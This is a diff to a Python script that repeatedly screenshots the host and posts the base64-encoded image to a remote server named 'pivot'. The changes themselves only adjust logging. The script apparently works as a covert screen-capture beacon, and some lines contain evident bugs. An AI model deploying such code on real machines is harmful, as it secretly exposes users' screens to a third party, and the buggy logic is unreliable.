@@ -6,16 +6,16 @@ import socket
 import time
 with open("{}-grab_log.txt".format(time.strftime("%Y-%m-%d-%H-%M-%S")), 'w') as log:
     try:
-        log.write("Beginning @ " + time.strftime("%Y-%m-%d-%H-%M-%S"))
+        log.write("Beginning @ " + time.strftime("%Y-%m-%d-%H-%M-%S") + "\n")
         try:
             arch = subprocess.check_output(['uname', '-m'])
         except FileNotFoundError:
             arch = None
-        log.write("arch: " + str(arch))
+        log.write("arch: " + str(arch) + "\n")
         server_path = "/includes/screen_requrest.php"
-        log.write("server path: " + str(server_path))
+        log.write("server path: " + str(server_path) + "\n")
         hostname = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_STREAM)]][0][1]
-        log.write("hostname: " + str(hostname))
+        log.write("hostname: " + str(hostname) + "\n")
         server_ip = "pivot"
         en = False
         time = 5
@@ -24,15 +24,15 @@ with open("{}-grab_log.txt".format(time.strftime("%Y-%m-%d-%H-%M-%S")), 'w') as 
         headers = {'Content-type': 'application/json'}
 
         while arch:
-            log.write("en state: " + en)
+            log.write("en state: " + en + "\n")
             subprocess.run(['sleep', str(time)])
             _obj = {
                 'hostname': hostname,
                 'file': ""
             }
             if en == True:
-                log.write("screenshotting enabled")
-                log.write("thumbnail percent = quality = " + str(quality))
+                log.write("screenshotting enabled" + "\n")
+                log.write("thumbnail percent = quality = " + str(quality) + "\n")
                 subprocess.run(['scrot', '--thumb', str(thumb_perc), '-q', str(quality), '{}.jpg'.format(hostname)])
 
                 with open('{}-thumb.jpg'.format(hostname), 'rb') as f:
@@ -40,7 +40,7 @@ with open("{}-grab_log.txt".format(time.strftime("%Y-%m-%d-%H-%M-%S")), 'w') as 
                     img = base64.b64encode(img).decode()
                     _obj['file'] = img
             else:
-                log.write("screenshotting disabled")
+                log.write("screenshotting disabled" + "\n")
             conn = http.HTTPConnection("{}:80".format(server_ip))
             _obj = json.dumps(_obj)
             _obj = _obj.encode()
@@ -58,5 +58,9 @@ with open("{}-grab_log.txt".format(time.strftime("%Y-%m-%d-%H-%M-%S")), 'w') as 
             [log.write(y) for y in ["{0}: {1}".format(x, flags[x]) for x in flags]]
     except Exception as excp:
         log.write("ERROR: \n" + str(excp) + "\n")
+        excp_info = sys.exc_info()[:]
+        exc_type, exc_obj, exc_tb = excp_info
+        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+        log.write(exc_type + "\n", fname + "\n", exc_tb.tb_lineno + "\n")
 
 
